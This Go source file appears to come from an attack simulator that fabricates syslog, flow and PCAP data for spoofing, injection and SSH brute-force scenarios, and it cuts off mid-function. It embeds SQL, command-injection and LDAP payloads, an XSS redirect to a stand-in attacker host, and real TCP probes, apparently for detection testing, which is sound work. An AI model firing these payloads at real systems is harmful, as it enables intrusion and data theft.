// Package main — attack_spoofing_auth_c2.go
// Spoofing, authentication, C2/malware, lateral movement, and wireless attack implementations.
package main

import (
	"fmt"
	"math/rand"
	"time"
)

// ──────────────────────────────────────────────────────────────────────────────
// Spoofing attacks
// ──────────────────────────────────────────────────────────────────────────────

func runARPSpoofing(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	logInfo("Entering runARPSpoofing attacker=%s", req.AttackerIP)

	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	victimIP := getAttackParam(req.Params, "victim_ip", "10.0.1.10")
	attackerDev := getAttackerDevice()
	switches := getSwitches()

	var frames [][]byte
	for _, swDev := range switches {
		if swDev.DeviceType != "switch" {
			continue
		}
		events := SyslogARPSpoofing(attackerDev.IPAddress, victimIP, swDev)
		result.SyslogCount += len(events)
		for _, ev := range events {
			eventID, _ := recordRunEvent(req.RunID, "syslog", swDev.Name, attackerDev.IPAddress, victimIP, "ARP", ev)
			result.EventIDs = append(result.EventIDs, eventID)
		}
	}

	// PCAP: ARP request from victim + legitimate reply from gateway + forged reply from attacker
	srcMAC := parseMACAddress(attackerDev.MACAddress)
	broadMAC := parseMACAddress("FF:FF:FF:FF:FF:FF")

	victimDev, _ := getDeviceByIP(victimIP)
	var victimMAC [6]byte
	if victimDev != nil {
		victimMAC = parseMACAddress(victimDev.MACAddress)
	} else {
		victimMAC = [6]byte{0x00, 0xBB, 0x22, 0x33, 0x44, 0x55}
	}

	fw := getFirewall()
	var gwMAC [6]byte
	gwIP := ""
	if fw != nil {
		gwMAC = parseMACAddress(fw.MACAddress)
		gwIP = fw.IPAddress
	} else {
		gwMAC = [6]byte{0x00, 0xCC, 0x33, 0x44, 0x55, 0x66}
		gwIP = "10.0.0.1"
	}

	// 1. ARP Request — victim broadcasts "who has gwIP?"
	request := buildARPRequest(victimMAC, victimIP, gwIP)
	reqFrame := buildEthernetFrameARP(victimMAC, broadMAC, request, 0x0806)
	frames = append(frames, reqFrame)

	// 2. Legitimate ARP Reply — real gateway responds to victim
	legitReply := buildARPReply(gwMAC, victimMAC, gwIP, victimIP)
	legitFrame := buildEthernetFrameARP(gwMAC, victimMAC, legitReply, 0x0806)
	frames = append(frames, legitFrame)

	// 3. Forged ARP Reply — attacker claims to be the gateway (poison)
	forgedReply := buildARPReply(srcMAC, victimMAC, gwIP, victimIP)
	forgedFrame := buildEthernetFrameARP(srcMAC, victimMAC, forgedReply, 0x0806)
	frames = append(frames, forgedFrame)

	bgFrames := generateBackgroundTraffic(getAllDevices())
	finalFrames := interleaveBackgroundTraffic(frames, bgFrames)
	path, _ := writePCAPFile(req.RunID, "arp_spoof", finalFrames, defaultDuration)
	if path != "" {
		result.PCAPFiles = append(result.PCAPFiles, path)
	}

	// Flow export — ARP gratuitous replies, one per switch
	for _, swDev := range switches {
		if swDev.DeviceType != "switch" {
			continue
		}
		duration := getAttackParamInt(req.Params, "duration", 30)
		arpPkts := uint32(5 * duration / 30) // ~5 gratuitous ARPs per 30s baseline
		if arpPkts < 1 {
			arpPkts = 1
		}
		flows := []FlowRecord{{
			SrcIP: attackerDev.IPAddress, DstIP: victimIP,
			SrcPort: 0, DstPort: 0, Protocol: 1,
			Bytes: arpPkts * 60, Packets: arpPkts,
			StartTime: time.Now().Add(-time.Duration(duration) * time.Second), EndTime: time.Now(),
		}}
		fc, fids := exportFlowsAllFormats(req.RunID, fw, swDev.Name, attackerDev.IPAddress, victimIP, "ARP", flows)
		result.FlowCount += fc
		result.EventIDs = append(result.EventIDs, fids...)
	}

	logInfo("Return from runARPSpoofing syslogs=%d pcap=%d", result.SyslogCount, len(result.PCAPFiles))
	return result, nil
}

func runIPSourceSpoof(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	logInfo("Entering runIPSourceSpoof attacker=%s", req.AttackerIP)

	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	spoofIP := getAttackParam(req.Params, "spoof_ip", "10.0.1.10")
	fw := getFirewall()

	for _, targetIP := range req.TargetIPs {
		msg := fmt.Sprintf("IP spoofing detected: src=%s claims trusted host %s — ingress filtering triggered", req.AttackerIP, spoofIP)
		ev := sendSyslog(fw, msg, 2)
		result.SyslogCount++
		eventID, _ := recordRunEvent(req.RunID, "syslog", "fw-perimeter", spoofIP, targetIP, "TCP", ev)
		result.EventIDs = append(result.EventIDs, eventID)

		flows := []FlowRecord{{SrcIP: spoofIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 443, Protocol: 6, Bytes: 5000, Packets: 10, StartTime: time.Now(), EndTime: time.Now().Add(time.Second)}}
		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", spoofIP, targetIP, "TCP", flows)
		result.FlowCount += fc
		result.EventIDs = append(result.EventIDs, fids...)

		// PCAP: finite loop of SYN → SYN-ACK → ACK-RST sequences
		// simulating IP source spoof where attacker uses spoofIP as source
		targetDev, _ := getDeviceByIP(targetIP)
		spoofDev, _ := getDeviceByIP(spoofIP)
		if targetDev != nil {
			attackerDev := getAttackerDevice()
			dstMAC := parseMACAddress(targetDev.MACAddress)
			attackerMAC := parseMACAddress(attackerDev.MACAddress)

			// spoofed device MAC — use real MAC if available, else synthesize
			var spoofMAC [6]byte
			if spoofDev != nil {
				spoofMAC = parseMACAddress(spoofDev.MACAddress)
			} else {
				spoofMAC = [6]byte{0x00, 0xAA, 0x11, 0x22, 0x33, byte(rand.Intn(255))}
			}

			var frames [][]byte
			for idx := 0; idx < 5; idx++ {
				srcPort := randomPort()
				dstPort := uint16(443)
				clientSeq := rand.Uint32()
				serverSeq := rand.Uint32()

				// 1. TCP SYN — attacker's MAC, spoofed source IP, to destination
				syn := buildTCPSegment(srcPort, dstPort, 0x02, clientSeq, 0, nil)
				synFrame := buildEthernetFrame(attackerMAC, dstMAC, buildIPv4Packet(spoofIP, targetIP, 6, syn))
				frames = append(frames, synFrame)

				// 2. TCP SYN-ACK — destination replies to spoofIP (the "target")
				synAck := buildTCPSegment(dstPort, srcPort, 0x12, serverSeq, clientSeq+1, nil)
				synAckFrame := buildEthernetFrame(dstMAC, spoofMAC, buildIPv4Packet(targetIP, spoofIP, 6, synAck))
				frames = append(frames, synAckFrame)

				// 3. TCP RST — spoofIP rejects the unexpected SYN-ACK
				rst := buildTCPSegment(srcPort, dstPort, 0x14, clientSeq+1, serverSeq+1, nil) // ACK+RST = 0x14
				rstFrame := buildEthernetFrame(spoofMAC, dstMAC, buildIPv4Packet(spoofIP, targetIP, 6, rst))
				frames = append(frames, rstFrame)
			}

			bgFrames := generateBackgroundTraffic(getAllDevices())
			finalFrames := interleaveBackgroundTraffic(frames, bgFrames)
			path, _ := writePCAPFile(req.RunID, "ip_source_spoof", finalFrames, defaultDuration)
			if path != "" {
				result.PCAPFiles = append(result.PCAPFiles, path)
			}
		}
	}
	return result, nil
}

func runDNSSpoofing(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	logInfo("Entering runDNSSpoofing attacker=%s", req.AttackerIP)

	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	domain := getAttackParam(req.Params, "target_domain", "corp.local")
	dnsDev := getDNSServer()
	if dnsDev == nil {
		return result, nil
	}

	msg := fmt.Sprintf("DNS cache poisoning attempt: forged response for %s from %s — DNSSEC validation failed", domain, req.AttackerIP)
	ev := sendSyslog(dnsDev, msg, 3)
	result.SyslogCount++
	eventID, _ := recordRunEvent(req.RunID, "syslog", dnsDev.Name, req.AttackerIP, dnsDev.IPAddress, "UDP", ev)
	result.EventIDs = append(result.EventIDs, eventID)

	flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: dnsDev.IPAddress, SrcPort: 53, DstPort: randomPort(), Protocol: 17, Bytes: 200, Packets: 2, StartTime: time.Now(), EndTime: time.Now().Add(time.Second)}}
	fw := getFirewall()
	fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, dnsDev.IPAddress, "UDP", flows)
	result.FlowCount += fc
	result.EventIDs = append(result.EventIDs, fids...)

	// PCAP: forged DNS response with attacker's chosen answer (cache poisoning)
	path, _ := PCAPDNSQueryResponse(req.RunID, "dns_spoof", req.AttackerIP, dnsDev.IPAddress, domain, false)
	if path != "" {
		result.PCAPFiles = append(result.PCAPFiles, path)
	}
	return result, nil
}

func runMACSpoofing(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	logInfo("Entering runMACSpoofing attacker=%s", req.AttackerIP)

	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	targetMAC := getAttackParam(req.Params, "target_mac", "00:11:22:33:44:05")
	attackerDev := getAttackerDevice()

	for _, swDev := range getSwitches() {
		msg := fmt.Sprintf("MAC address %s has moved from port Gi0/1 to port Gi0/5 — possible MAC spoofing", targetMAC)
		ev := sendSyslog(swDev, msg, 3)
		result.SyslogCount++
		eventID, _ := recordRunEvent(req.RunID, "syslog", swDev.Name, req.AttackerIP, "broadcast", "ETH", ev)
		result.EventIDs = append(result.EventIDs, eventID)

		// PCAP: target device TCP chatter interleaved with attacker's DHCP request
		// Both happening simultaneously on the network
		if attackerDev != nil {
			clonedMAC := parseMACAddress(targetMAC)
			dstMAC := parseMACAddress(swDev.MACAddress)
			broadcastMAC := [6]byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

			// Find target device IP
			var targetDevIP string
			for _, d := range getAllDevices() {
				if d.MACAddress == targetMAC {
					targetDevIP = d.IPAddress
					break
				}
			}
			if targetDevIP == "" {
				targetDevIP = "10.0.1.10"
			}

			// Find other devices for TCP chatter
			var otherDevices []*Device
			for _, d := range getDevicesByZone("internal") {
				if d.MACAddress != targetMAC && d.DeviceType != "switch" && len(otherDevices) < 3 {
					otherDevices = append(otherDevices, d)
				}
			}

			// Pre-build TCP chatter frames
			type tcpConv struct{ syn, synAck, ack []byte }
			var convs []tcpConv
			for _, other := range otherDevices {
				otherMAC := parseMACAddress(other.MACAddress)
				srcPort := randomPort()
				seq := rand.Uint32()
				serverSeq := rand.Uint32()
				syn := buildEthernetFrame(clonedMAC, otherMAC, buildIPv4Packet(targetDevIP, other.IPAddress, 6, buildTCPSegment(srcPort, 80, 0x02, seq, 0, nil)))
				synAck := buildEthernetFrame(otherMAC, clonedMAC, buildIPv4Packet(other.IPAddress, targetDevIP, 6, buildTCPSegment(80, srcPort, 0x12, serverSeq, seq+1, nil)))
				ack := buildEthernetFrame(clonedMAC, otherMAC, buildIPv4Packet(targetDevIP, other.IPAddress, 6, buildTCPSegment(srcPort, 80, 0x10, seq+1, serverSeq+1, nil)))
				convs = append(convs, tcpConv{syn, synAck, ack})
			}

			// Pre-build DHCP frames
			xid := rand.Uint32()
			discoverOptions := buildDHCPOption(53, []byte{0x01})
			discoverOptions = append(discoverOptions, buildDHCPOption(50, []byte{192, 168, 1, 99})...)
			discoverOptions = append(discoverOptions, buildDHCPOption(55, []byte{0x01, 0x03, 0x06, 0x0f})...)
			discover := buildDHCPPacket(0x01, xid, clonedMAC, "0.0.0.0", "0.0.0.0", "0.0.0.0", "0.0.0.0", discoverOptions)
			discoverFrame := buildEthernetFrame(clonedMAC, broadcastMAC, buildIPv4Packet("0.0.0.0", "255.255.255.255", 17, buildUDPDatagram(68, 67, discover)))

			offerOptions := buildDHCPOption(53, []byte{0x02})
			offerOptions = append(offerOptions, buildDHCPOption(51, []byte{0x00, 0x01, 0x51, 0x80})...)
			offerOptions = append(offerOptions, buildDHCPOption(1, []byte{255, 255, 255, 0})...)
			offerOptions = append(offerOptions, buildDHCPOption(3, []byte{10, 0, 1, 1})...)
			offer := buildDHCPPacket(0x02, xid, clonedMAC, "0.0.0.0", "192.168.1.99", swDev.IPAddress, "0.0.0.0", offerOptions)
			offerFrame := buildEthernetFrame(dstMAC, clonedMAC, buildIPv4Packet(swDev.IPAddress, "255.255.255.255", 17, buildUDPDatagram(67, 68, offer)))

			requestOptions := buildDHCPOption(53, []byte{0x03})
			requestOptions = append(requestOptions, buildDHCPOption(50, []byte{192, 168, 1, 99})...)
			requestOptions = append(requestOptions, buildDHCPOption(54, dhcpIPv4Bytes(swDev.IPAddress))...)
			request := buildDHCPPacket(0x01, xid, clonedMAC, "0.0.0.0", "0.0.0.0", "0.0.0.0", "0.0.0.0", requestOptions)
			requestFrame := buildEthernetFrame(clonedMAC, broadcastMAC, buildIPv4Packet("0.0.0.0", "255.255.255.255", 17, buildUDPDatagram(68, 67, request)))

			ackOptions := buildDHCPOption(53, []byte{0x05})
			ackOptions = append(ackOptions, buildDHCPOption(51, []byte{0x00, 0x01, 0x51, 0x80})...)
			ackOptions = append(ackOptions, buildDHCPOption(1, []byte{255, 255, 255, 0})...)
			ackOptions = append(ackOptions, buildDHCPOption(3, []byte{10, 0, 1, 1})...)
			dhcpAck := buildDHCPPacket(0x02, xid, clonedMAC, "0.0.0.0", "192.168.1.99", swDev.IPAddress, "0.0.0.0", ackOptions)
			dhcpAckFrame := buildEthernetFrame(dstMAC, clonedMAC, buildIPv4Packet(swDev.IPAddress, "255.255.255.255", 17, buildUDPDatagram(67, 68, dhcpAck)))

			// Interleave TCP chatter with DHCP — everything happening at once
			var frames [][]byte
			if len(convs) > 0 {
				frames = append(frames, convs[0].syn) // target SYN to device 1
			}
			frames = append(frames, discoverFrame) // attacker DHCP Discover (cloned MAC)
			if len(convs) > 0 {
				frames = append(frames, convs[0].synAck) // device 1 SYN-ACK to target
				frames = append(frames, convs[0].ack)    // target ACK
			}
			frames = append(frames, offerFrame) // DHCP Offer from server
			if len(convs) > 1 {
				frames = append(frames, convs[1].syn) // target SYN to device 2
				frames = append(frames, convs[1].synAck)
			}
			frames = append(frames, requestFrame) // attacker DHCP Request
			if len(convs) > 1 {
				frames = append(frames, convs[1].ack)
			}
			if len(convs) > 2 {
				frames = append(frames, convs[2].syn) // target SYN to device 3
			}
			frames = append(frames, dhcpAckFrame) // DHCP ACK — attacker gets new IP
			if len(convs) > 2 {
				frames = append(frames, convs[2].synAck)
				frames = append(frames, convs[2].ack)
			}

			bgFrames := generateBackgroundTraffic(getAllDevices())
			finalFrames := interleaveBackgroundTraffic(frames, bgFrames)
			path, _ := writePCAPFile(req.RunID, "mac_spoof", finalFrames, defaultDuration)
			if path != "" {
				result.PCAPFiles = append(result.PCAPFiles, path)
			}

			// Flow export
			fw := getFirewall()
			duration := getAttackParamInt(req.Params, "duration", 30)
			macPkts := uint32(10 * duration / 30)
			if macPkts < 1 {
				macPkts = 1
			}
			flows := []FlowRecord{{
				SrcIP: attackerDev.IPAddress, DstIP: swDev.IPAddress,
				SrcPort: randomPort(), DstPort: 80, Protocol: 6,
				Bytes: macPkts * 60, Packets: macPkts,
				StartTime: time.Now().Add(-time.Duration(duration) * time.Second), EndTime: time.Now(),
				TCPFlags: 0x02,
			}}
			fc, fids := exportFlowsAllFormats(req.RunID, fw, swDev.Name, attackerDev.IPAddress, swDev.IPAddress, "ETH", flows)
			result.FlowCount += fc
			result.EventIDs = append(result.EventIDs, fids...)
		}
	}
	return result, nil
}

// ──────────────────────────────────────────────────────────────────────────────
// Injection attacks
// ──────────────────────────────────────────────────────────────────────────────

func runSQLInjection(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	logInfo("Entering runSQLInjection attacker=%s targets=%v", req.AttackerIP, req.TargetIPs)

	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	endpoint := getAttackParam(req.Params, "endpoint", "/login")

	for _, targetIP := range req.TargetIPs {
		targetDev, _ := getDeviceByIP(targetIP)
		if targetDev == nil {
			continue
		}
		payloads := []string{"' OR 1=1--", "' UNION SELECT NULL,NULL--", "'; DROP TABLE users;--", "1' AND '1'='1"}
		for _, payload := range payloads {
			msg := fmt.Sprintf("%s - - [%s] \"POST %s HTTP/1.1\" 500 432 - SQL injection detected: %s",
				req.AttackerIP, time.Now().Format("02/Jan/2006:15:04:05 -0700"), endpoint, payload)
			ev := sendSyslog(targetDev, msg, 3)
			result.SyslogCount++
			eventID, _ := recordRunEvent(req.RunID, "syslog", targetDev.Name, req.AttackerIP, targetIP, "TCP", ev)
			result.EventIDs = append(result.EventIDs, eventID)
		}

		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 80, Protocol: 6, Bytes: uint32(len(payloads) * 500), Packets: uint32(len(payloads) * 4), StartTime: time.Now(), EndTime: time.Now().Add(2 * time.Second), TCPFlags: 0x18}}
		fw := getFirewall()
		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
		result.FlowCount += fc
		result.EventIDs = append(result.EventIDs, fids...)

		// PCAP: one representative request/response pair
		reqPayload := []byte(fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=%s&password=x",
			endpoint, targetIP, payloads[0]))
		respPayload := []byte("HTTP/1.1 500 Internal Server Error\r\nContent-Length: 0\r\n\r\n")
		path, _ := PCAPGenericTCPExchange(req.RunID, "sql_injection", req.AttackerIP, targetIP, 80, reqPayload, respPayload)
		if path != "" {
			result.PCAPFiles = append(result.PCAPFiles, path)
		}
	}
	return result, nil
}

func runCommandInjection(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	for _, targetIP := range req.TargetIPs {
		targetDev, _ := getDeviceByIP(targetIP)
		if targetDev == nil {
			continue
		}
		msg := fmt.Sprintf("Command injection via web parameter: src=%s cmd='id; cat /etc/passwd' executed on %s", req.AttackerIP, targetIP)
		ev := sendSyslog(targetDev, msg, 2)
		result.SyslogCount++
		eventID, _ := recordRunEvent(req.RunID, "syslog", targetDev.Name, req.AttackerIP, targetIP, "TCP", ev)
		result.EventIDs = append(result.EventIDs, eventID)

		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 80, Protocol: 6, Bytes: 1500, Packets: 6, StartTime: time.Now(), EndTime: time.Now().Add(time.Second), TCPFlags: 0x18}}
		fw := getFirewall()
		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
		result.FlowCount += fc
		result.EventIDs = append(result.EventIDs, fids...)

		// PCAP
		reqPayload := []byte(fmt.Sprintf("GET /ping?host=8.8.8.8;cat%%20/etc/passwd HTTP/1.1\r\nHost: %s\r\n\r\n", targetIP))
		respPayload := []byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
		path, _ := PCAPGenericTCPExchange(req.RunID, "command_injection", req.AttackerIP, targetIP, 80, reqPayload, respPayload)
		if path != "" {
			result.PCAPFiles = append(result.PCAPFiles, path)
		}
	}
	return result, nil
}

func runXSSInjection(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	for _, targetIP := range req.TargetIPs {
		targetDev, _ := getDeviceByIP(targetIP)
		if targetDev == nil {
			continue
		}
		token := randomHexString(8)
		msg := fmt.Sprintf("%s - - \"GET /search?q=<script>document.location='http://attacker/%s'</script> HTTP/1.1\" 200 1234",
			req.AttackerIP, token)
		ev := sendSyslog(targetDev, msg, 4)
		result.SyslogCount++
		eventID, _ := recordRunEvent(req.RunID, "syslog", targetDev.Name, req.AttackerIP, targetIP, "TCP", ev)
		result.EventIDs = append(result.EventIDs, eventID)

		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 80, Protocol: 6, Bytes: 1800, Packets: 6, StartTime: time.Now(), EndTime: time.Now().Add(time.Second), TCPFlags: 0x18}}
		fw := getFirewall()
		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
		result.FlowCount += fc
		result.EventIDs = append(result.EventIDs, fids...)

		// PCAP
		reqPayload := []byte(fmt.Sprintf("GET /search?q=<script>document.location='http://attacker/%s'</script> HTTP/1.1\r\nHost: %s\r\n\r\n", token, targetIP))
		respPayload := []byte("HTTP/1.1 200 OK\r\nContent-Length: 1234\r\n\r\n")
		path, _ := PCAPGenericTCPExchange(req.RunID, "xss_injection", req.AttackerIP, targetIP, 80, reqPayload, respPayload)
		if path != "" {
			result.PCAPFiles = append(result.PCAPFiles, path)
		}
	}
	return result, nil
}

func runLDAPInjection(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	dcIPs := domainControllerIPs()
	for _, dcIP := range dcIPs {
		dcDev, _ := getDeviceByIP(dcIP)
		if dcDev == nil {
			continue
		}
		msg := fmt.Sprintf("LDAP injection attempt from %s: filter='(|(uid=*)(password=*)' — authentication bypass attempt", req.AttackerIP)
		ev := sendSyslog(dcDev, msg, 3)
		result.SyslogCount++
		eventID, _ := recordRunEvent(req.RunID, "syslog", dcDev.Name, req.AttackerIP, dcIP, "TCP", ev)
		result.EventIDs = append(result.EventIDs, eventID)

		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: dcIP, SrcPort: randomPort(), DstPort: 389, Protocol: 6, Bytes: 1200, Packets: 6, StartTime: time.Now(), EndTime: time.Now().Add(time.Second), TCPFlags: 0x18}}
		fw := getFirewall()
		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, dcIP, "TCP", flows)
		result.FlowCount += fc
		result.EventIDs = append(result.EventIDs, fids...)

		// PCAP: proper BER-encoded LDAP injection
		// Bind request first (anonymous bind to establish session)
		bindReq := buildLDAPBindRequest("dc=corp,dc=local")
		bindResp := buildLDAPBindResponse()

		// Injected SearchRequest with malicious filter (|(uid=*)(password=*))
		// Built manually with BER encoding to match real LDAP injection traffic
		injFilter := []byte{
			0xA1, 0x24, // OR filter [1] — 36 bytes
			0xA3, 0x0F, // equalityMatch [3] — uid=admin\x00*
			0x04, 0x03, 0x75, 0x69, 0x64, // attributeDesc: "uid"
			0x04, 0x08, 0x27, 0x4F, 0x52, 0x20, 0x27, 0x31, 0x27, 0x3D, // assertionValue: "'OR '1'="
			0xA3, 0x11, // equalityMatch [3] — password=*
			0x04, 0x08, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6F, 0x72, 0x64, // attributeDesc: "password"
			0x04, 0x05, 0x27, 0x4F, 0x52, 0x27, 0x31, // assertionValue: "'OR'1"
		}

		// Build full SearchRequest with injected filter
		var searchReq []byte
		searchBody := make([]byte, 0, 80)
		baseDN := []byte("dc=corp,dc=local")
		searchBody = append(searchBody, 0x04, byte(len(baseDN)))
		searchBody = append(searchBody, baseDN...)
		searchBody = append(searchBody, 0x0A, 0x01, 0x02) // scope: wholeSubtree
		searchBody = append(searchBody, 0x0A, 0x01, 0x00) // derefAliases
		searchBody = append(searchBody, 0x02, 0x01, 0x00) // sizeLimit: 0
		searchBody = append(searchBody, 0x02, 0x01, 0x00) // timeLimit: 0
		searchBody = append(searchBody, 0x01, 0x01, 0x00) // typesOnly: false
		searchBody = append(searchBody, injFilter...)
		searchBody = append(searchBody, 0x30, 0x00) // attributes: empty (return all)

		searchReq = append(searchReq, berTLV(0x63, searchBody)...)                    // SearchRequest [APPLICATION 3]
		fullSearchReq := berTLV(0x30, append([]byte{0x02, 0x01, 0x02}, searchReq...)) // SEQUENCE { msgID=2, searchReq }

		// SearchResultDone: success (resultCode=0)
		searchDone := berTLV(0x30, append([]byte{0x02, 0x01, 0x02},
			berTLV(0x65, []byte{ // SearchResultDone [APPLICATION 5]
				0x0A, 0x01, 0x00, // resultCode: success (bypass succeeded)
				0x04, 0x00, // matchedDN: ""
				0x04, 0x00, // diagnosticMessage: ""
			})...))

		// Build PCAP: Bind → BindResponse → injected Search → SearchResultDone
		srcMAC := [6]byte{0x00, 0xAA, 0x11, 0x22, 0x33, byte(rand.Intn(255))}
		dstMAC := [6]byte{0x00, 0xAA, 0xBB, 0xCC, 0xDD, 0x01}
		srcPort := randomPort()
		seq := rand.Uint32()
		serverSeq := rand.Uint32()

		var ldapFrames [][]byte

		// TCP handshake
		syn := buildTCPSegment(srcPort, 389, 0x02, seq, 0, nil)
		ldapFrames = append(ldapFrames, buildEthernetFrame(srcMAC, dstMAC, buildIPv4Packet(req.AttackerIP, dcIP, 6, syn)))
		synAck := buildTCPSegment(389, srcPort, 0x12, serverSeq, seq+1, nil)
		ldapFrames = append(ldapFrames, buildEthernetFrame(dstMAC, srcMAC, buildIPv4Packet(dcIP, req.AttackerIP, 6, synAck)))
		ack := buildTCPSegment(srcPort, 389, 0x10, seq+1, serverSeq+1, nil)
		ldapFrames = append(ldapFrames, buildEthernetFrame(srcMAC, dstMAC, buildIPv4Packet(req.AttackerIP, dcIP, 6, ack)))

		// LDAP Bind Request
		bindReqSeg := buildTCPSegment(srcPort, 389, 0x18, seq+1, serverSeq+1, bindReq)
		ldapFrames = append(ldapFrames, buildEthernetFrame(srcMAC, dstMAC, buildIPv4Packet(req.AttackerIP, dcIP, 6, bindReqSeg)))

		// LDAP Bind Response
		bindRespSeg := buildTCPSegment(389, srcPort, 0x18, serverSeq+1, seq+uint32(len(bindReq))+1, bindResp)
		ldapFrames = append(ldapFrames, buildEthernetFrame(dstMAC, srcMAC, buildIPv4Packet(dcIP, req.AttackerIP, 6, bindRespSeg)))

		// LDAP injected SearchRequest
		searchSeg := buildTCPSegment(srcPort, 389, 0x18, seq+uint32(len(bindReq))+1, serverSeq+uint32(len(bindResp))+1, fullSearchReq)
		ldapFrames = append(ldapFrames, buildEthernetFrame(srcMAC, dstMAC, buildIPv4Packet(req.AttackerIP, dcIP, 6, searchSeg)))

		// LDAP SearchResultDone — success (injection bypassed auth)
		searchDoneSeg := buildTCPSegment(389, srcPort, 0x18, serverSeq+uint32(len(bindResp))+1, seq+uint32(len(bindReq))+uint32(len(fullSearchReq))+1, searchDone)
		ldapFrames = append(ldapFrames, buildEthernetFrame(dstMAC, srcMAC, buildIPv4Packet(dcIP, req.AttackerIP, 6, searchDoneSeg)))

		bgFrames := generateBackgroundTraffic(getAllDevices())
		finalFrames := interleaveBackgroundTraffic(ldapFrames, bgFrames)
		path, _ := writePCAPFile(req.RunID, "ldap_injection", finalFrames, defaultDuration)
		if path != "" {
			result.PCAPFiles = append(result.PCAPFiles, path)
		}
	}
	return result, nil
}

// ──────────────────────────────────────────────────────────────────────────────
// Authentication attacks
// ──────────────────────────────────────────────────────────────────────────────

func runBruteForceSSH(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	logInfo("Entering runBruteForceSSH attacker=%s targets=%v", req.AttackerIP, req.TargetIPs)

	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	attackerDev, _ := getDeviceByIP(req.AttackerIP)
	if attackerDev == nil {
		attackerDev = getAttackerDevice()
	}

	for _, targetIP := range req.TargetIPs {
		targetDev, _ := getDeviceByIP(targetIP)
		if targetDev == nil {
			continue
		}
		events := SyslogBruteForce(attackerDev, targetDev, "ssh")
		result.SyslogCount += len(events)
		for _, ev := range events {
			eventID, _ := recordRunEvent(req.RunID, "syslog", targetDev.Name, req.AttackerIP, targetIP, "TCP", ev)
			result.EventIDs = append(result.EventIDs, eventID)
		}

		duration := getAttackParamInt(req.Params, "duration", 60)
		sshPkts := uint32(200 * duration / 60) // 200 pkts per 60s baseline
		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 22, Protocol: 6,
			Bytes: sshPkts * 200, Packets: sshPkts,
			StartTime: time.Now().Add(-time.Duration(duration) * time.Second), EndTime: time.Now()}}
		fw := getFirewall()
		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
		result.FlowCount += fc
		result.EventIDs = append(result.EventIDs, fids...)

		// PCAP (Option B)
		// PCAP (Option B)
		path, _ := PCAPBruteForce(req.RunID, req.AttackerIP, targetIP, 22, "ssh", 10, nil)
		if path != "" {
			result.PCAPFiles = append(result.PCAPFiles, path)
		}

		// Real packets (Option A)
		go sendRealTCPProbe(targetIP, 22, sshClientBanner, 5)
	}
	return result, nil
}

func runBruteForceRDP(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	attackerDev := getAttackerDevice()
	for _, targetIP := range req.TargetIPs {
		targetDev, _ := getDeviceByIP(targetIP)
		if targetDev == nil {
			continue
		}
		events := SyslogBruteForce(attackerDev, targetDev, "rdp")
		result.SyslogCount += len(events)
		for _, ev := range events {
			eventID, _ := recordRunEvent(req.RunID, "syslog", targetDev.Name, req.AttackerIP, targetIP, "TCP", ev)
